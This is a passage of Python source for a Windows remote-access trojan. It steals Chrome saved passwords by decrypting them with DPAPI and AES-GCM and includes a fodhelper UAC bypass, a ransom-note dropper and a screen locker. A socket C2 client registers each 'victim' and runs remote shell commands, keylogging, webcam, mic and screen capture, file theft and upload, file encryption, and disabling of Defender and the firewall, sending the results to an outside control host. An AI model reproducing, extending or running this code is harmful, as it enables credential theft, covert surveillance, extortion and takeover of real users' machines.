        # Continue anyway if mutex creation fails
        return False

def launch_admin_copy():
    """Spawn a new copy of this script via UAC prompt (RunAs) using ShellExecute."""
    try:
        script_path = os.path.realpath(sys.argv[0])
        exe_path = sys.executable
        # Prefer pythonw.exe to avoid a console window
        if exe_path.lower().endswith("python.exe"):
            pythonw = exe_path[:-9] + "pythonw.exe"
            if os.path.exists(pythonw):
                exe_path = pythonw
        params = f'"{script_path}"'
        # ShellExecuteW returns >32 on success
        rc = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", exe_path, params, None, 0
        )
        if rc <= 32:
            log(f"ShellExecuteW failed with code {rc}")
            return False
        return True
    except Exception as e:
        log(f"launch_admin_copy error: {e}")
        return False


# Update IS_ADMIN after helper available
IS_ADMIN = is_admin()

def steal_chrome_passwords():
    """Steal Chrome saved passwords - supports both old and new encryption methods"""
    if not has_win32crypt:
        return "win32crypt not available (install pywin32)"
    
    result = "Chrome Passwords:\n\n"
    found_any = False
    
    # Try different Chrome profile paths
    chrome_profiles = [
        ("Default", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default")),
        ("Profile 1", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 1")),
        ("Profile", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile")),
    ]
    
    # Try to get master key for AES decryption (Chrome v80+)
    def get_master_key(local_state_path):
        """Get Chrome master key from Local State file"""
        try:
            if not os.path.exists(local_state_path):
                log(f"Local State file not found: {local_state_path}")
                return None
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
                encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key', '')
                if not encrypted_key:
                    log("No encrypted_key in os_crypt")
                    return None
                # Decode base64
                encrypted_key = base64.b64decode(encrypted_key)
                # Remove 'DPAPI' prefix (5 bytes) - Chrome prefixes with "DPAPI"
                if len(encrypted_key) < 5 or encrypted_key[:5] != b'DPAPI':
                    log(f"Master key doesn't start with DPAPI prefix (first 5 bytes: {encrypted_key[:5]})")
                    return None
                encrypted_key = encrypted_key[5:]
                # Decrypt using Windows DPAPI
                master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                if not master_key:
                    log("CryptUnprotectData returned None")
                    return None
                if len(master_key) < 32:
                    log(f"Master key too short: {len(master_key)} bytes (need at least 32)")
                    return None
                log(f"Master key extracted: {len(master_key)} bytes, first 8 bytes: {master_key[:8].hex()}")
                return master_key
        except Exception as e:
            log(f"Failed to get master key: {e}")
            import traceback
            log(traceback.format_exc())
            return None
    
    # Try AES decryption (Chrome v80+)
    def decrypt_aes_password(encrypted_password, master_key):
        """Decrypt password using AES-256-GCM (Chrome v80+)"""
        try:
            from Crypto.Cipher import AES
            
            if not isinstance(encrypted_password, bytes) or len(encrypted_password) < 15:
                return None
            
            version_prefix = encrypted_password[:3]
            
            if version_prefix not in [b'v10', b'v11', b'v20'] or not master_key:
                return None
            
            # Chrome v80+ format: vXX (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
            nonce = encrypted_password[3:15]  # 12 bytes after version prefix
            ciphertext_with_tag = encrypted_password[15:]
            
            if len(ciphertext_with_tag) < 16:
                return None
            
            ciphertext = ciphertext_with_tag[:-16]
            tag = ciphertext_with_tag[-16:]
            
            # Try with master key directly (first 32 bytes)
            try:
                cipher = AES.new(master_key[:32], AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8')
            except:
                # If that fails, try with full master key (if it's longer)
                if len(master_key) > 32:
                    try:
                        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                        return decrypted.decode('utf-8')
                    except:
                        pass
                
                # Try alternative: maybe the format is different for v20
                # Some versions might have different structure
                if version_prefix == b'v20':
                    # Try without slicing master key
                    try:
                        # Use exactly 32 bytes from start
                        key = master_key[:32] if len(master_key) >= 32 else master_key
                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                        return decrypted.decode('utf-8')
                    except Exception as e2:
                        log(f"v20 decrypt attempt failed: {e2}")
                        return None
                
                return None
            
        except ImportError:
            return None
        except Exception as e:
            log(f"AES decrypt error: {e}")
            return None
    
    for profile_name, profile_path in chrome_profiles:
        login_db_path = os.path.join(profile_path, "Login Data")
        # Local State is in the User Data folder, not the profile folder
        user_data_dir = os.path.dirname(profile_path)
        local_state_path = os.path.join(user_data_dir, "Local State")
        
        if not os.path.exists(login_db_path):
            continue
        
        try:
            # Get master key for this profile
            master_key = get_master_key(local_state_path)
            if master_key:
                log(f"Master key obtained successfully (length: {len(master_key)})")
            else:
                log(f"Failed to get master key from {local_state_path}")
            
            # Copy database to temp location (Chrome locks the original)
            temp_db = os.path.join(tempfile.gettempdir(), f"chrome_login_{int(time.time())}.db")
            shutil.copy2(login_db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            rows = cursor.fetchall()
            if rows:
                found_any = True
                for row in rows:
                    url = row[0] or "[No URL]"
                    username = row[1] or "[No Username]"
                    encrypted_pwd = row[2]
                    
                    pwd = None
                    
                    # Check if password is encrypted (should be bytes)
                    if not isinstance(encrypted_pwd, bytes):
                        continue
                    
                    # Check if it's new Chrome format (v10/v11/v20) - try AES first
                    version_prefix = encrypted_pwd[:3] if len(encrypted_pwd) >= 3 else b''
                    if version_prefix in [b'v10', b'v11', b'v20'] and master_key:
                        # Method 1: AES decryption (Chrome v80+)
                        try:
                            log(f"Attempting AES decrypt for {url} with version {version_prefix.decode('utf-8', errors='ignore')}")
                            pwd = decrypt_aes_password(encrypted_pwd, master_key)
                            if pwd:
                                log(f"Successfully decrypted password for {url}")
                        except Exception as e:
                            log(f"AES decrypt failed for {url}: {e}")
                            pass
                    elif version_prefix in [b'v10', b'v11', b'v20']:
                        log(f"Password has {version_prefix.decode('utf-8', errors='ignore')} prefix but no master key available for {url}")
                    
                    # Method 2: Old win32crypt (Chrome < v80 or if AES failed)
                    if not pwd:
                        try:
                            decrypted = win32crypt.CryptUnprotectData(encrypted_pwd, None, None, None, 0)[1]
                            if isinstance(decrypted, bytes):
                                # Try to decode as UTF-8
                                pwd = decrypted.decode('utf-8', errors='ignore')
                            else:
                                pwd = str(decrypted)
                        except:
                            pass
                    
                    # Validate password is not gibberish
                    def is_valid_password(text):
                        """Check if decrypted text looks like a real password"""
                        if not text or len(text) == 0:
                            return False
                        # Check if it's mostly printable characters
                        printable_count = sum(1 for c in text if c.isprintable() or c in '\n\r\t')
                        if printable_count < len(text) * 0.8:  # At least 80% printable
                            return False
                        # Check if it's not all the same character
                        if len(set(text)) < 2 and len(text) > 3:
                            return False
                        return True
                    
                    if pwd and is_valid_password(pwd):
                        result += f"URL: {url}\nUser: {username}\nPass: {pwd}\n{'='*50}\n"
                    elif pwd:
                        # Got something but it's gibberish - log for debugging
                        log(f"Gibberish password for {url}: {pwd[:20]}...")
                        result += f"URL: {url}\nUser: {username}\nPass: [DECRYPT FAILED - Invalid result]\n{'='*50}\n"
                    else:
                        result += f"URL: {url}\nUser: {username}\nPass: [DECRYPT FAILED - Try closing Chrome]\n{'='*50}\n"
            
            conn.close()
            # Clean up temp file
            try:
                os.remove(temp_db)
            except:
                pass
            
            if found_any:
                break  # Found passwords, no need to check other profiles
                
        except sqlite3.OperationalError:
            # Database is locked or corrupted
            continue
        except Exception as e:
            log(f"Chrome password steal error: {e}")
            continue
    
    if not found_any:
        return "Chrome not found, locked, or no saved passwords. Try closing Chrome first."
    
    return result if len(result) > 30 else "No passwords found"

# ================= FULL INTERACTIVE REMOTE SHELL =================
REMOTE_SHELL_ACTIVE = False
REMOTE_SHELL_THREAD = None


def remote_shell_worker():
    global REMOTE_SHELL_ACTIVE
    send_now("Remote shell activated — type your commands (use /exit to quit)")

    while REMOTE_SHELL_ACTIVE:
        time.sleep(0.1)  # Reduced from 1s to 0.1s for faster response
        # The actual command will be stored in a global by the main handler
        if hasattr(remote_shell_worker, "pending_cmd"):
            cmd = remote_shell_worker.pending_cmd
            del remote_shell_worker.pending_cmd

            if cmd.strip().lower() in ["exit", "/exit", "quit"]:
                REMOTE_SHELL_ACTIVE = False
                send_now("Remote shell closed.")
                break

            send_now(f"$ {cmd}")
            try:
                result = subprocess.getoutput(cmd)
                if not result:
                    result = "(no output)"
                # Split long output
                for i in range(0, len(result), 3900):
                    send_now(result[i:i + 3900])
            except Exception as e:
                send_now(f"Error: {str(e)}")

def drop_ransom_note():
    try:
        desktop = os.path.join(os.getenv("USERPROFILE"), "Desktop")
        note = """!!! YOUR FILES ARE ENCRYPTED !!!
Send 0.5 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
Victim ID: GHOST2025"""
        with open(os.path.join(desktop, "README.txt"), "w") as f:
            f.write(note)
        wall = os.path.join(tempfile.gettempdir(), "wall.jpg")
        urllib.request.urlretrieve("https://i.imgur.com/9ZJqK3l.jpg", wall)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, wall, 3)
    except Exception as e:
        send_now(f"Ransom error: {str(e)[:200]}")


# --- Keyboard / hotkey stubs for lock screen (no-op implementations) ---
def disable_keys():
    """Stub: disable special keys (Ctrl+Alt+Del, etc.). Currently no-op."""
    return


def enable_keys():
    """Stub: re-enable keys. Currently no-op."""
    return


def start_keyboard_block_thread():
    """Stub: start low-level keyboard block. Currently no-op."""
    return


def stop_keyboard_block():
    """Stub: stop low-level keyboard block. Currently no-op."""
    return

def _destroy_lock_window():
    """Helper to destroy the lock window safely."""
    global _lock_window
    if _lock_window:
        try:
            _lock_window.destroy()
        except:
            pass
        _lock_window = None


def lock_screen_fbi():
    global _lock_thread
    
    # Kill explorer + block hotkeys (your existing code)
    try: os.system("taskkill /f /im explorer.exe >nul 2>&1")
    except: pass
    disable_keys()                    # ← your existing function
    start_keyboard_block_thread()     # ← your low-level hook from previous message

    # Start GUI in its own dedicated thread (this is the real fix)
    _lock_thread = Thread(target=_lock_gui_thread, daemon=True)
    _lock_thread.start()
    
    send_now("HARDENED LOCK v3 — NO MORE Tcl_AsyncDelete CRASH")

def unlock_screen_remote():
    global _lock_root, _lock_thread
    # Safely destroy the GUI from its own thread
    if _lock_root and _lock_root.winfo_exists():
        try:
            _lock_root.after(0, _lock_root.destroy)   # This is the key line
        except:
            pass

    # Re-enable everything
    enable_keys()
    stop_keyboard_block()
    try: os.system("start explorer.exe")
    except: pass

    send_now("Screen unlocked")

def uac_bypass():
    try:
        if not winreg:
            return False

        subkey = r"Software\Classes\ms-settings\shell\open\command"
        # Create/open key
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, subkey)
        # Set default value to current python executable + script path
        payload = f'"{sys.executable}" "{os.path.realpath(sys.argv[0])}"'
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, payload)
        # Set DelegateExecute empty value
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)

        # Trigger fodhelper elevated
        subprocess.run("fodhelper.exe", shell=True, creationflags=0x08000000)
        time.sleep(1)  # Reduced from 3s to 1s

        # Cleanup
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, subkey)
        except OSError:
            # DeleteTree may be needed on some systems
            try:
                winreg.DeleteTree(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
            except Exception:
                pass
        return True
    except Exception as e:
        log(f"uac_bypass error: {e}")
        return False

_pending_upload_path = None

# ================= (OLD TELEGRAM COMMAND HANDLER REMOVED) =================
def tg_get_commands():
    """Legacy stub – Telegram transport removed. Only Discord is used now."""
    return


# ================= SIMPLE quick_c2 CLIENT =================
#
# This provides a minimal polling C2 transport compatible with quick_c2.py.
#
# Supported commands (string payloads received from server):
#   /shell <cmd>       - run a shell command, return stdout/stderr
#   /pic               - single screenshot, returned as file
#   /wifi              - wifi credentials (text)
#   /pass              - Chrome passwords (text)
#   /ls [path]         - directory listing
#   /cd <path>         - change working directory
#   /dl <file>         - download single file
#   /status            - minimal status string
#
import socket


def _c2_send_json(sock: socket.socket, obj: dict) -> None:
    data = json.dumps(obj).encode("utf-8")
    header = len(data).to_bytes(4, "big")
    sock.sendall(header + data)


def _c2_recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("connection closed")
        buf += chunk
    return buf


def _c2_recv_json(sock: socket.socket):
    header = sock.recv(4)
    if not header:
        return None
    if len(header) < 4:
        header += _c2_recv_exact(sock, 4 - len(header))
    length = int.from_bytes(header, "big")
    if length <= 0 or length > 100_000_000:  # Increased to 100MB for video files
        raise ValueError("invalid c2 message length")
    data = _c2_recv_exact(sock, length)
    return json.loads(data.decode("utf-8", errors="replace"))


def _c2_handle_command(cmd: str, incoming_file=None):
    """
    Minimal synchronous command dispatcher used in quick_c2 mode.
    Returns tuple: (ok: bool, output: str, file_path: Optional[str])
    """
    global _current_dir, RUN_SCREENSHOTS, RUN_VIDEO, RUN_MIC, RUN_KEYLOGGER, RUN_WEBCAM_LIVE
    cmd = (cmd or "").strip()
    cmd_lower = cmd.lower()

    # /shell
    if cmd_lower.startswith("/shell "):
        try:
            result = subprocess.getoutput(cmd[7:])
            if not result:
                result = "(no output)"
            return True, result, None
        except Exception as e:
            return False, f"shell error: {e}", None

    # /pic (webcam photo)
    if cmd_lower == "/pic":
        if not has_media:
            return False, "media libraries not available for webcam", None
        p = take_webcam_photo()
        if p:
            return True, "webcam photo captured", p
        return False, "webcam photo failed", None

    # /wifi
    if cmd_lower == "/wifi":
        try:
            return True, steal_wifi_passwords(), None
        except Exception as e:
            return False, f"wifi error: {e}", None

    # /pass
    if cmd_lower == "/pass":
        try:
            return True, steal_chrome_passwords(), None
        except Exception as e:
            return False, f"pass dump error: {e}", None

    # /ls
    if cmd_lower.startswith("/ls"):
        path_arg = cmd[3:].strip()
        if not path_arg:
            path = _current_dir
        else:
            if path_arg == "..":
                path = os.path.dirname(_current_dir) if _current_dir != os.path.dirname(_current_dir) else _current_dir
            else:
                if not os.path.isabs(path_arg):
                    path = os.path.join(_current_dir, path_arg)
                else:
                    path = path_arg
            path = os.path.normpath(path)

        if not os.path.exists(path):
            return False, f"Path not found: {path}", None
        if os.path.isfile(path):
            info = f"File: {path}\nSize: {os.path.getsize(path):,} bytes"
            return True, info, None

        _current_dir = path
        try:
            items = []
            dirs = []
            files = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                try:
                    if os.path.isdir(item_path):
                        dirs.append(f"[DIR] {item}/")
                    else:
                        size = os.path.getsize(item_path)
                        files.append(f"[FILE] {item} ({size:,} bytes)")
                except Exception:
                    pass
            items = sorted(dirs) + sorted(files)
            result = f"DIR {path}\n\n" + "\n".join(items[:200])
            if len(items) > 200:
                result += f"\n... and {len(items) - 200} more items"
            return True, result, None
        except Exception as e:
            return False, f"Error listing directory: {str(e)[:200]}", None

    # /cd
    if cmd_lower.startswith("/cd "):
        new_path = cmd[4:].strip()
        if not new_path:
            return True, f"Current directory: {_current_dir}", None
        if not os.path.isabs(new_path):
            new_path = os.path.join(_current_dir, new_path)
        new_path = os.path.normpath(new_path)
        if os.path.exists(new_path) and os.path.isdir(new_path):
            _current_dir = new_path
            return True, f"Changed to: {_current_dir}", None
        return False, f"Directory not found: {new_path}", None

    # /pwd - show current working directory
    if cmd_lower == "/pwd":
        return True, f"Current directory: {_current_dir}", None

    # /dl
    if cmd_lower.startswith("/dl "):
        file_path = cmd[4:].strip()
        if not file_path:
            return False, "Usage: /dl <file_path>", None
        if not os.path.isabs(file_path):
            file_path = os.path.join(_current_dir, file_path)
        file_path = os.path.normpath(file_path)
        if not os.path.exists(file_path):
            return False, f"File not found: {file_path}", None
        if os.path.isdir(file_path):
            return False, "Path is a directory. Use /ls to browse", None
        return True, f"Sending file: {os.path.basename(file_path)}", file_path

    # /status
    if cmd_lower == "/status":
        status = f"ID: {VICTIM_ID}\n"
        status += f"Dir: {_current_dir}\n"
        status += f"Admin: {IS_ADMIN}"
        return True, status, None

    # /screenshot [count] - take screenshots (default: 1, max: 50)
    if cmd_lower.startswith("/screenshot"):
        if not has_media:
            return False, "Media libraries not available for screenshots", None
        
        # Parse count parameter
        parts = cmd.split()
        count = 1  # Default to 1 screenshot
        
        if len(parts) > 1:
            try:
                count = int(parts[1])
                if count < 1:
                    count = 1
                elif count > 50:  # Limit to prevent abuse
                    count = 50
            except ValueError:
                return False, "Invalid count. Usage: /screenshot [count]", None
        
        if count == 1:
            # Single screenshot (immediate)
            p = take_screenshot()
            if p:
                return True, "Screenshot captured", p
            return False, "Screenshot failed", None
        else:
            # Multiple screenshots
            if RUN_SCREENSHOTS:
                return True, "Screenshot burst already running", None
            
            # Start custom screenshot burst
            RUN_SCREENSHOTS = True
            threading.Thread(target=lambda: screenshot_burst(count), daemon=True).start()
            return True, f"Taking {count} screenshots...", None

    # /video [duration] - record screen video (default: 30s, max: 300s)
    if cmd_lower.startswith("/video"):
        if not has_media:
            return False, "Media libraries not available for video", None
        
        # Parse duration parameter
        parts = cmd.split()
        duration = 30  # Default to 30 seconds
        
        if len(parts) > 1:
            try:
                duration = int(parts[1])
                if duration < 5:  # Minimum 5 seconds
                    duration = 5
                elif duration > 300:  # Maximum 5 minutes to prevent abuse
                    duration = 300
            except ValueError:
                return False, "Invalid duration. Usage: /video [seconds]", None
        
        if RUN_VIDEO:
            return True, "Video recording already running", None
            
        RUN_VIDEO = True
        threading.Thread(target=lambda: video_with_system_audio(duration), daemon=True).start()
        return True, f"Video recording started ({duration}s screen + audio)", None

    # /mic
    if cmd_lower == "/mic":
        if not has_media:
            return False, "Media libraries not available for mic", None
        if not RUN_MIC:
            RUN_MIC = True
            threading.Thread(target=mic_loop, daemon=True).start()
            return True, "Mic recording started (30s clips)", None
        return True, "Mic already running", None

    # /keylog
    if cmd_lower == "/keylog":
        if not has_keylogger:
            return False, "Keylogger library (pynput) not available", None
        if not RUN_KEYLOGGER:
            RUN_KEYLOGGER = True
            threading.Thread(target=keylogger_worker, daemon=True).start()
            return True, "Keylogger started", None
        return True, "Keylogger already running", None

    # /livecam
    if cmd_lower.startswith("/livecam"):
        if not has_media:
            return False, "Media libraries not available for webcam", None
        parts = cmd.split()
        idx = None
        if len(parts) > 1:
            try:
                idx = int(parts[1])
            except ValueError:
                return False, "Usage: /livecam [index]", None
        if not RUN_WEBCAM_LIVE:
            RUN_WEBCAM_LIVE = True
            threading.Thread(target=lambda: webcam_live_stream(idx), daemon=True).start()
            return True, "Live webcam stream STARTED (10-sec clips)", None
        return True, "Live webcam stream already running", None

    # /stop or /stopall
    if cmd_lower in ["/stop", "/stopall"]:
        RUN_SCREENSHOTS = RUN_VIDEO = RUN_MIC = RUN_KEYLOGGER = RUN_WEBCAM_LIVE = False
        return True, "All long-running tasks STOPPED", None

    # /stopcam
    if cmd_lower == "/stopcam":
        RUN_WEBCAM_LIVE = False
        return True, "Live webcam stream STOPPED", None

    # /ransom
    if cmd_lower == "/ransom":
        threading.Thread(target=drop_ransom_note, daemon=True).start()
        return True, "Ransom note deployment triggered", None

    # /lock
    if cmd_lower == "/lock":
        threading.Thread(target=lock_screen_fbi, daemon=True).start()
        return True, "Lock screen triggered", None

    # /unlock
    if cmd_lower == "/unlock":
        unlock_screen_remote()
        return True, "Unlock requested", None

    # /encrypt
    if cmd_lower == "/encrypt":
        # Use current directory if available, otherwise encrypt default folders
        target_dir = _current_dir if _current_dir else None
        def _do_encrypt():
            msg = encrypt_files(target_dir)
            send_now(msg)
        threading.Thread(target=_do_encrypt, daemon=True).start()
        if target_dir:
            return True, f"Starting encryption of files in: {target_dir}", None
        return True, "Starting encryption of user files...", None

    # /disabledefender
    if cmd_lower == "/disabledefender":
        try:
            return True, disable_defender(), None
        except Exception as e:
            return False, f"disabledefender error: {e}", None

    # /disablefirewall
    if cmd_lower == "/disablefirewall":
        try:
            return True, disable_firewall(), None
        except Exception as e:
            return False, f"disablefirewall error: {e}", None

    # /webcam (one-shot photo)
    if cmd_lower.startswith("/webcam"):
        if not has_media:
            return False, "Media libraries not available for webcam", None
        parts = cmd.split()
        idx = None
        if len(parts) > 1:
            try:
                idx = int(parts[1])
            except ValueError:
                return False, "Usage: /webcam [index]", None
        p = take_webcam_photo(idx)
        if p:
            return True, "Webcam photo captured", p
        return False, "Webcam not found or failed to capture", None

    # /admin (attempt elevation)
    if cmd_lower == "/admin":
        def _do_admin():
            try:
                send_now("Attempting elevation via UAC prompt…")
                if launch_admin_copy():
                    send_now("Prompt sent — elevated copy will connect if user approves.")
                    time.sleep(0.5)
                    os._exit(0)
                else:
                    send_now("Failed to trigger UAC prompt.")
            except Exception as e:
                log(f"/admin handler error (quick_c2): {e}")
        threading.Thread(target=_do_admin, daemon=True).start()
        return True, "UAC elevation attempt started", None

    # /help
    if cmd_lower in ["/help", "/h"]:
        help_text = (
            "**BASIC:** /pic /webcam /wifi /pass /shell cmd /status\n"
            "**MEDIA:** /screenshot /video /mic /keylog /livecam /audiosetup\n"
            "**FILES:** /ls [path] /cd <path> /pwd /dl <file>\n"
            "**SYSTEM:** /lock /unlock /ransom /stop\n"
            "**SECURITY:** /admin /disabledefender /disablefirewall\n"
            "**MISC:** /encrypt"
        )
        return True, help_text, None

    # /audiosetup
    if cmd_lower == "/audiosetup":
        setup_text = (
            "🎵 AUDIO SETUP GUIDE:\n"
            "1. Right-click the sound icon in system tray\n"
            "2. Select 'Sounds' or 'Open Sound settings'\n"
            "3. Go to 'Recording' tab\n"
            "4. Right-click in empty area → 'Show Disabled Devices'\n"
            "5. Find 'Stereo Mix' and right-click → 'Enable'\n"
            "6. Set 'Stereo Mix' as default recording device\n"
            "7. Try /video command again for audio capture\n\n"
            "Alternative: Use /mic for microphone recording"
        )
        return True, setup_text, None

    # /upload (server → victim file upload)
    if cmd_lower.startswith("/upload"):
        if not incoming_file or "file_b64" not in incoming_file:
            return False, "No file payload provided for /upload", None
        parts = cmd.split(maxsplit=1)
        if len(parts) == 1 or not parts[1].strip():
            return False, "Usage: /upload <remote_path>", None
        dst = parts[1].strip()
        try:
            raw = base64.b64decode(incoming_file["file_b64"].encode("utf-8"))
            fname = incoming_file.get("file_name") or os.path.basename(dst) or "uploaded.bin"
            # If dst is a directory-like path, drop into it
            if dst.endswith(os.sep) or os.path.isdir(dst):
                final = os.path.join(dst, fname)
            else:
                final = dst
            os.makedirs(os.path.dirname(final), exist_ok=True)
            with open(final, "wb") as f:
                f.write(raw)
            return True, f"Uploaded file to: {final}", None
        except Exception as e:
            return False, f"Upload error: {e}", None

    # Default: unknown command
    return False, f"Unknown command: {cmd}", None


def run_quick_c2_client():
    """
    Main blocking loop for quick_c2 transport.
    Handles reconnect and polling logic with enhanced reconnection.
    """
    connection_attempts = 0
    max_backoff = 60  # Maximum backoff time in seconds
    
    while True:
        try:
            connection_attempts += 1
            
            # Progressive backoff: start with 1s, increase up to max_backoff
            if connection_attempts > 1:
                backoff_time = min(2 ** (connection_attempts - 2), max_backoff)
                log(f"[C2] Connection attempt #{connection_attempts}, waiting {backoff_time}s before retry...", also_print=True)
                time.sleep(backoff_time)
            
            log(f"[C2] Attempting to connect to {QUICK_C2_HOST}:{QUICK_C2_PORT}...", also_print=True)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)  # Increased timeout for better reliability
            sock.connect((QUICK_C2_HOST, QUICK_C2_PORT))
            
            # Reset connection attempts on successful connection
            connection_attempts = 0
            log(f"[C2] ✅ Connected to quick_c2 at {QUICK_C2_HOST}:{QUICK_C2_PORT}", also_print=True)

            # Register with enhanced info
            reg = {
                "type": "register",
                "id": VICTIM_ID,
                "user": os.getenv("USERNAME", "?"),
                "host": os.getenv("COMPUTERNAME", "?"),
                "os": sys.platform,
                "version": "2.0",  # Version info for C2 server
                "capabilities": {
                    "media": has_media,
                    "keylogger": has_keylogger,
                    "admin": is_admin()
                }
            }
            _c2_send_json(sock, reg)

            # Main communication loop
            while True:
                # First flush any pending async events (logs, media, keylogs, etc.)
                try:
                    events_sent = 0
                    while events_sent < 10:  # Limit to prevent flooding
                        try:
                            item = _c2_outbox.get_nowait()
                        except queue.Empty:
                            break
                        
                        text = item.get("text") or ""
                        file_path = item.get("file_path")
                        event_msg = {
                            "type": "result",
                            "id": VICTIM_ID,
                            "task_id": "event",
                            "ok": True,
                            "output": str(text)[:4000],
                        }
                        
                        if file_path and os.path.exists(file_path):
                            try:
                                with open(file_path, "rb") as f:
                                    raw = f.read()
                                event_msg["file_name"] = os.path.basename(file_path)
                                event_msg["file_b64"] = base64.b64encode(raw).decode("utf-8")
                            except Exception as e:
                                event_msg["output"] += f"\n[file send error: {e}]"
                        
                        _c2_send_json(sock, event_msg)
                        events_sent += 1
                        
                except Exception as e:
                    log(f"[C2] Outbox flush error: {e}")

                # Poll for task with keepalive
                try:
                    _c2_send_json(sock, {"type": "poll", "id": VICTIM_ID})
                    resp = _c2_recv_json(sock)
                    if resp is None:
                        raise ConnectionError("C2 closed connection")

                    if resp.get("type") == "task":
                        task_id = resp.get("task_id")
                        command = resp.get("command") or ""
                        incoming_file = None
                        if resp.get("file_name") and resp.get("file_b64"):
                            incoming_file = {
                                "file_name": resp.get("file_name"),
                                "file_b64": resp.get("file_b64"),
                            }
                        
                        log(f"[C2] Executing command: {command[:50]}...")
                        ok, output, file_path = _c2_handle_command(command, incoming_file=incoming_file)

                        result_msg = {
                            "type": "result",
                            "id": VICTIM_ID,
                            "task_id": task_id,
                            "ok": ok,
                            "output": output[:4000] if isinstance(output, str) else str(output)[:4000],
                        }

                        if file_path and os.path.exists(file_path):
                            try:
                                with open(file_path, "rb") as f:
                                    raw = f.read()
                                result_msg["file_name"] = os.path.basename(file_path)
                                result_msg["file_b64"] = base64.b64encode(raw).decode("utf-8")
                            except Exception as e:
                                result_msg["output"] += f"\n[file send error: {e}]"

                        _c2_send_json(sock, result_msg)
                    else:
                        # No task; sleep before next poll
                        time.sleep(2)  # Reduced from 3s to 2s for more responsive polling
                        
                except socket.timeout:
                    log("[C2] Poll timeout, continuing...")
                    continue
                except Exception as e:
                    log(f"[C2] Communication error: {e}")
                    raise  # Re-raise to trigger reconnection

        except socket.gaierror as e:
            log(f"[C2] ❌ DNS/Network error: {e} (check QUICK_C2_HOST)", also_print=True)
            time.sleep(10)  # Longer wait for DNS issues
        except ConnectionRefusedError:
            log(f"[C2] ❌ Connection refused - C2 server not running or port blocked", also_print=True)
            time.sleep(5)
        except socket.timeout:
            log(f"[C2] ❌ Connection timeout - server unreachable", also_print=True)
            time.sleep(5)
        except Exception as e:
            log(f"[C2] ❌ Connection error: {e}", also_print=True)
            try:
                sock.close()
            except Exception:
                pass
            time.sleep(3)  # General error backoff

# ================= MEDIA FUNCTIONS =================
if has_media:
    def take_screenshot():
        try:
            path = os.path.join(tempfile.gettempdir(), f"pic_{int(time.time())}.jpg")
            ImageGrab.grab().save(path, "JPEG", quality=70)
            return path
        except Exception as e:
            log(f"take_screenshot error: {e}")
            send_now(f"Screenshot error: {str(e)[:200]}")
            return None

    def take_webcam_photo(index=None):
        """Capture photo from webcam. If index is None, probe indices 0–2."""
        cap = None
        used_idx = None
        try:
            # Use specified index or probe 0–2
            cap, used_idx = _open_camera_for_index(index)
            if not cap or not cap.isOpened():
                log("Webcam: Failed to open any camera")
                return None

            # Set resolution and FPS
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
            cap.set(cv2.CAP_PROP_FPS, 30)

            # Warm-up with a bounded time to avoid long hangs
            start = time.time()
            warm_frames = 10  # reduced to speed up
            for _ in range(warm_frames):
                if time.time() - start > 3:  # 3s safety timeout
                    log("Webcam: Warm-up timeout")
                    return None
                ret, _ = cap.read()
                if not ret:
                    time.sleep(0.05)
                    continue

            # Now capture the frame
            ret, frame = cap.read()
            if not ret or frame is None:
                log("Webcam: Failed to capture frame after warm-up")
                return None

            # Verify frame is not empty
            if frame.size == 0:
                log("Webcam: Captured empty frame")
                return None

            # Save as JPEG
            suffix = f"_idx{used_idx}" if used_idx is not None else ""
            path = os.path.join(tempfile.gettempdir(), f"webcam_{int(time.time())}{suffix}.jpg")
            success = cv2.imwrite(path, frame, [cv2.IMWRITE_JPEG_QUALITY, 85])

            if not success or not os.path.exists(path):
                log("Webcam: Failed to save image")
                return None

            return path
        except Exception as e:
            log(f"take_webcam_photo error: {e}")
            return None
        finally:
            if cap is not None:
                try:
                    cap.release()
                except:
                    pass

    def screenshot_loop():
        """Continuous screenshot loop (legacy - use screenshot_burst instead)"""
        batch = []
        while RUN_SCREENSHOTS:
            p = take_screenshot()
            if p:
                batch.append(p)
            if len(batch) >= 15:
                zip_path = os.path.join(tempfile.gettempdir(), f"screens_{int(time.time())}.zip")
                with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
                    for f in batch:
                        z.write(f, os.path.basename(f))
                send_now(file_path=zip_path)
                for f in batch:
                    try:
                        os.remove(f)
                    except:
                        pass
                batch = []
            time.sleep(0.5)  # Reduced from 1.5s to 0.5s for much faster screenshot bursts

    def screenshot_burst(count):
        """Take a specific number of screenshots"""
        global RUN_SCREENSHOTS
        batch = []
        
        try:
            for i in range(count):
                if not RUN_SCREENSHOTS:  # Allow early termination
                    break
                    
                p = take_screenshot()
                if p:
                    batch.append(p)
                    log(f"Screenshot {i+1}/{count} captured")
                
                # Small delay between screenshots (except for the last one)
